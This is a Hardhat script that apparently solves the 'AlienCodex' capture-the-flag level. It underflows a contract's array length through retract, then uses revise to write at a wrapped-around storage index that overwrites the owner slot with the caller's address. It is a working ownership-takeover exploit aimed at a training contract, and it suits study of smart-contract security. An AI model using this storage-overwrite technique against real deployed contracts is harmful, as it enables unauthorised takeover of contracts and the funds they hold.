const hre = require("hardhat");
const deploy = require("./deploy").deploy
const ethers = hre.ethers;

require('dotenv').config()

async function main() {

  const [owner] = await ethers.getSigners()

  const alien = await ethers.getContractAt("AlienCodex", process.env.ALIEN)

  let tx = await alien.make_contact();
  await tx.wait()

  const f = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
  const injection = "0x000000000000000000000001" + owner.address.substring(2)

  tx = await alien.retract()
  await tx.wait()

  const codexSlot = ethers.BigNumber.from(ethers.utils.solidityKeccak256(['uint256'], [1]))

  tx = await alien.revise(ethers.BigNumber.from(f).sub(codexSlot).add(1), injection)
  await tx.wait()

  console.log("=============== CONTRACT STORAGE ===============");
  for (let i = 0; i < 2; i++) {
    console.log(await ethers.provider.getStorageAt(alien.address, i))
  }

  console.log(`Owner: ${await alien.owner()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
